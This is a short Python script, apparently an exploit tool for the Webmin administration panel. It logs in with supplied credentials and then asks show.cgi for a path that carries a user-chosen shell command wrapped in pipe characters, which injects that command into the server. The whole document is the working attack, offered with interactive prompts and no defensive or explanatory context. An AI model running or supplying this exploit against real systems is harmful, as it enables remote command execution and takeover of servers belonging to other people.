import requests
import sys
import urllib.parse

hostname = input('[i] Enter hostname: ')
port = int(input('[i] Enter port number: '))
username = input('[i] Enter Webmin username: ')
password = input('[i] Enter Webmin password: ')
command_to_execute = input('[i] Enter command to execute: ')

payload = {
    'page' : "%2F",
    'user': username,
    'pass': password
}

s = requests.Session()
r = s.get(f'http://{hostname}:{port}')

print('[+] Logging in...')

r = s.post(f'http://{hostname}:{port}/session_login.cgi', data = payload, verify=False, allow_redirects=False)  
if r.status_code != 302:
    print('[-] Bad credentials or too many login tries!')
    sys.exit()
 
r = s.get(f'http://{hostname}:{port}/file/show.cgi/bin/AAAAA|{urllib.parse.quote(command_to_execute)}|')
 



